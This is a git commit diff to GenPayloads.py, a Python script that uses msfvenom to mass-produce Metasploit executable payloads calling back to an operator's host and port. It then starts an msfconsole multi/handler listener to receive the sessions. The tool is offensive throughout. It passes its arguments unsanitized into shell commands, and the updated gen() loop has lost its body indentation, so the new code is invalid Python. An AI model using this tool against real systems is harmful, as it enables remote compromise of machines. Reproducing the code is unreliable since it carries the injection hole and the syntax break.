c59175127350c3328a650a2cddd0586a97abac3c
Chris Campbell <obscuresec@gmail.com>
2013-08-08 15:05:12 -0400

    Update GenPayloads.py

--- GenPayloads.py
+++ GenPayloads.py
@@ -11,33 +11,33 @@ import subprocess
 
 #write a resource file and call it
 def build(payload,lhost,lport):
-  options = "use multi/handler\n"
-  options += "set payload %s\n" % (payload)
-	options += "set LHOST %s\nset LPORT %s\n" % (lhost,lport)
-	options += "set ExitOnSession false\n"
-	options += "exploit -j\n"
-	filewrite = file("listener.rc", "w")
-	filewrite.write(options)
-	filewrite.close()
-	subprocess.Popen("msfconsole -r listener.rc", shell=True).wait()
+    options = "use multi/handler\n"
+    options += "set payload %s\n" % (payload)
+    options += "set LHOST %s\nset LPORT %s\n" % (lhost,lport)
+    options += "set ExitOnSession false\n"
+    options += "exploit -j\n"
+    filewrite = file("listener.rc", "w")
+    filewrite.write(options)
+    filewrite.close()
+    subprocess.Popen("msfconsole -r listener.rc", shell=True).wait()
 
 #generate payloads with msfvenom
 def gen(payload,lhost,lport,num):
-	for x in range(0, num):
-		filename = "payload_%s_%s" % (lport,x)
-		venom = "msfvenom -p %s LHOST=%s LPORT=%s -f exe > %s" % (payload,lhost,lport,filename)
-		subprocess.Popen(venom, shell=True)
+    for x in range(0, int(num)):
+    filename = "payload_%s_%s" % (lport,x)
+    venom = "msfvenom -p %s LHOST=%s LPORT=%s -f exe > %s" % (payload,lhost,lport,filename)
+    subprocess.Popen(venom, shell=True)
 
 #grab args
 try:    
-	payload = sys.argv[1]
-	lhost = sys.argv[2]
-	lport = sys.argv[3]
-	num = sys.argv[4]
+    payload = sys.argv[1]
+    lhost = sys.argv[2]
+    lport = sys.argv[3]
+    num = sys.argv[4]
 	
-	gen(payload,lhost,lport,num)
-	build(payload,lhost,lport)
+    gen(payload,lhost,lport,num)
+    build(payload,lhost,lport)
 
 #index error
 except IndexError:
-	print "python GenPayloads.py payload lhost lport number"	
+    print "python GenPayloads.py payload lhost lport number"
